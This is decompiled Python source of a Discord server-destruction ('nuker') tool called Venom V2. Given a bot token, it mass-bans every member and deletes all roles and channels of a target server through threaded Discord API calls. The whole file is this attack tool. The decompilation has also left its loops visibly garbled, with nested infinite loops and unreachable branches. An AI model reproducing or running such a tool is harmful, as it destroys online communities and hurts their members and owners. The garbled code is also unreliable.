# decompyle3 version 3.9.0a1
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.0 (tags/v3.8.0:fa919fd, Oct 14 2019, 19:37:50) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: 1.py
import os, sys, time, requests, json, discord, asyncio, threading
from discord.ext import commands
os.system('cls')
with open('config.json') as f:
    config = json.load(f)
token = config.get('token')
guildid = config.get('serverID')
intents = discord.Intents.all()
intents.members = True
headers = {'Authorization': f"Bot {token}"}
client = commands.Bot(command_prefix='.', case_insensitive=False,
  intents=intents)
client.remove_command('help')
i = 0
membercount = 0
channelcount = 0
rolecount = 0

@client.event
async def on_ready():
    os.system('cls||clear')
    await main()


async def menudc():
    os.system('cls||clear')
    time.sleep(1)
    guild = guildid
    txt = open('scrape/channels.txt')
    for channels in txt:
        threading.Thread(target=massdc, args=(guild, channels)).start()
    else:
        txt.close()
        time.sleep(1)


def massdc(guild, channel):
    global channelcount
    global i
    while True:
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])

        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            if i < channelcount:
                i += 1
                if i == 1:
                    print(' [X] %dst Channel Deleted | VENOM W' % i)
        elif i == 2:
            while True:
                while True:
                    print(' [X] %dnd Channel Deleted | VENOM W' % i)

                if i == 3:
                    while True:
                        while True:
                            print(' [X] %drd Channel Deleted | VENOM W' % i)

                        print(' [X] %dth Channel Deleted | VENOM W' % i)


async def menudr():
    os.system('cls||clear')
    time.sleep(1)
    guild = guildid
    txt = open('scrape/roles.txt')
    for roles in txt:
        threading.Thread(target=massdr, args=(guild, roles)).start()
    else:
        txt.close()
        time.sleep(1)


def massdr(guild, role):
    global i
    while True:
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])

        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            if i < channelcount:
                i += 1
                if i == 1:
                    print(' [X] %dst Role Deleted | VENOM W' % i)
        elif i == 2:
            while True:
                while True:
                    print(' [X] %dnd Role Deleted | VENOM W' % i)

                if i == 3:
                    while True:
                        while True:
                            print(' [X] %drd Role Deleted | VENOM W' % i)

                        print(' [X] %dth Role Deleted | VENOM W' % i)


async def menuban():
    guild = guildid
    txt = open('scrape/members.txt')
    for member in txt:
        threading.Thread(target=massban, args=(guild, member)).start()
    else:
        txt.close()
        time.sleep(4)


def massban(guild, member):
    global i
    global membercount
    while True:
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])

        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            if i < membercount:
                i += 1
                if i == 1:
                    print(' [>] %dst user has been banned' % i)
        elif i == 2:
            while True:
                while True:
                    print(' [>] %dnd user has been banned' % i)

                if i == 3:
                    while True:
                        while True:
                            print(' [>] %drd user has been banned' % i)

                        print(' [>] %dth user has been banned' % i)


async def main():
    while len(sys.argv) < 2:
        sys.stdout.write('\x1b[38;5;56m\n\n                             @                     @                            \n                           @@*                     *@@                          \n                          @@@                       @@@                         \n                         @@@@                       @@@@                        \n                         @@@@@                     @@@@@                        \n                         .@@@@@@@               @@@@@@@@                                              \n                         @@@@@@@@@@           @@@@@@@@@@                        \n                          @@@@@@@@@@ *     , @@@@@@@@@@                                        \n                             #@@@@@@@@@   @@@@@@@@@*                                                      \n                                   &@@@   @@@@. &                               \n                             @@@                @@@@                            \n                             @,@@@@@@@ @   @@@@@@@                              \n                                 @@#@@ @ @&@/@@.                                \n                                 . # @ @ @ @ @#                                 \n                                     # @ @ #    @                               \n                               @@               @                               \n                                @               @                               \n                                @&@    @      @@                                \n                                 @@ /  @ & @  @@                                \n                                  .@@@ @ @ @@@                                  \n                                    @@@@@@@@@                                                                                                     \n   ')

    option = input(f"\n             ╦  ╦╔═╗╔╗╔╔═╗╔╦╗          [Logged Into] {client.user} \n             ╚╗╔╝║╣ ║║║║ ║║║║ \n              ╚╝ ╚═╝╝╚╝╚═╝╩ ╩          [ServerID] {guildid}\n          \x1b[38;5;56m╔═══════════════════════════════════════════════════════╗\x1b[37m\n          \x1b[38;5;56m║ [Mass Ban] 1                        [Comming Soon] 3  ║\x1b[37m\n          \x1b[38;5;56m║                                                       ║\x1b[37m\n          \x1b[38;5;56m║ [Delete All Roles] 2              [Delete Channels] 4 ║\x1b[37m\n          \x1b[38;5;56m║                                                       ║\x1b[37m\n          \x1b[38;5;56m╚═══════════════════════════════════════════════════════╝\x1b[37m\n")
    while option == '1':
        await menuban()
        await main()

    if option == '2':
        await menudr()
        await main()
    while option == '3':
        await main()

    if option == '4':
        await menudc()
        await main()
    else:
        print('\n [!] Invalid Option')
        time.sleep(0.5)
        main()


def check():
    os.system('title Venom V2 │ Made By RBaller')
    try:
        client.run(token)
    except:
        print('\n [!] Invalid Token')
        time.sleep(2)


check()
